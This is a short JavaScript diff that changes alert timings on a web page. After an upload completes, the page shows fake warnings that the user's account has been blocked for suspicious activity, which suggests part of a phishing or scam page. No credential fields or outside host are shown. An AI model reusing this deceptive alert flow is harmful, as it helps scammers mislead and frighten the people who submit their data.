@@ -1,4 +1,4 @@
-form=document.getElementsByTagName('form').onsubmit= e => e.preventDefault()
+//form=document.getElementsByTagName('form').onsubmit= e => e.preventDefault()
 
 
     
@@ -19,11 +19,11 @@ let btn= document.querySelector('.btn');
       insert.on('state_change', snapshot => {
         setTimeout(()=> {
           swal("", "Suspicious Activities Detected", "warning");
-        },1000)
+        },6000)
 
         setTimeout(()=>{
           swal("", "Your Account Has Been Blocked ", "error");
-        }, 3000)
+        }, 9000)
 
 
       })
